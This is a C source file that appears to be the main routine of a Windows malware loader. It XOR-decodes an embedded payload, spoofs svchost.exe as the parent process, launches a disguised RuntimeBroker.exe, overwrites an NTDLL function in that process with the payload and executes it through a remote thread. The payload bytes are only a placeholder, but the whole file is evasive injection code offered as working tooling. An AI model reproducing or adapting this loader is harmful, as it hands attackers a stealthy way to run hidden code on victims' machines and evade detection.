#include "common.h"

int main()
{

	// Payload
	BYTE pPayload[] = { 0x37, 0x9a, 0x69, 0x4f, 0x0a, 0x32, 0xbf, 0x07, 0xe8 };
	SIZE_T sPayloadSize = 9;
	BYTE pKey[] = { 0x76, 0xe9, 0x0d, 0x29, 0x6b, 0x41, 0xdb, 0x61, 0xe2, 0xf6, 0x05, 0x32, 0x5c, 0x95, 0xb3, 0x0a, 0x63, 0x31, 0x43, 0x71, 0x45, 0xa6, 0x71, 0x27, 0xac, 0xc6, 0x01, 0x94, 0x7f, 0x50, 0x12, 0xbc };

	for (size_t i = 0, j = 0; i < sPayloadSize; i++, j++) {
		if (j >= 32)
		{
			j = 0;
		}
		pPayload[i] = pPayload[i] ^ pKey[j];
	}
	
	// Retrieve parent PID for spoof
	DWORD dwParentID = NULL;
	HANDLE hParent = NULL;
	LPWSTR sProcessName = "svchost.exe";
	FindPPID(sProcessName, &hParent, &dwParentID);

	// Create spoofed windows process
	DWORD dwProcessID = 1;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	LPWSTR sCreate = "RuntimeBroker.exe";
	CreateSpoofedProcess(hParent, sCreate, &dwProcessID, &hProcess, &hThread);
	
	// Stomp an imported function within spoofed process
	LPCWSTR sStompModule = L"NTDLL.DLL";
	LPCSTR sStompFunction = "RtlReleaseMemoryStream";
	PVOID pAddress = StompRemoteFunction(hProcess, sStompModule, sStompFunction, pPayload, sPayloadSize);

	// Execute a thread of stomped function
	RemoteThreadExecute(hProcess, pAddress);

	return EXIT_SUCCESS;
}